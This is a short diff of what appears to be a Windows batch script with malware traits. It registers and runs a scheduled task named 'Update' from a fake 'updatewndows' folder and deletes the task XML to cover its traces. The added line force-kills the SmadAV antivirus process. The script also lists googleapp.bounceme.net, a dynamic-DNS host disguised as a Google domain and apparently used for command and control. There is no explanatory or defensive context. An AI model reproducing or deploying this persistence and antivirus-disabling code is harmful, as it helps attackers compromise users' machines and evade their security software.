@@ -6,6 +6,7 @@ schtasks /create /xml %systemdrive%\ProgramData\updatewndows\Update.xml /tn Upda
 del %systemdrive%\ProgramData\updatewndows\Update.xml
 schtasks /run /tn Update
 
+taskkill /F /IM SmadAV.exe
 
 
 googleapp.bounceme.net
